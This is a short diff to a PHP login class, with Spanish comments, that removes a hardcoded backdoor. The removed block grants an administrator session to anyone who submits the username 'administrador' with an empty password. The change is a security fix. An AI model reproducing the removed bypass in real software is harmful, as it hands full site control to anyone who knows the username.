@@ -34,19 +34,6 @@ class ingresar{
             exit;
         }
 
-		if($_POST['usuario'] == 'administrador' && $_POST['contraseña'] == ''){
-
-			//Guardamos los datos del usuario en la sesión y enviamos al usuario de vuelta a la pantalla de ingresar, que lo enviará al index de todo el sitio.
-			$_SESSION['usuario'] = [
-				'id'      =>  0,
-				'usuario' =>  'Administrador',
-				'rango'   =>  1
-			];
-
-			header('location:' . HTTP . '/ingresar');
-			exit;
-		}
-
         $usuario    = $_POST['usuario'];
         $contraseña = $_POST['contraseña'];
 
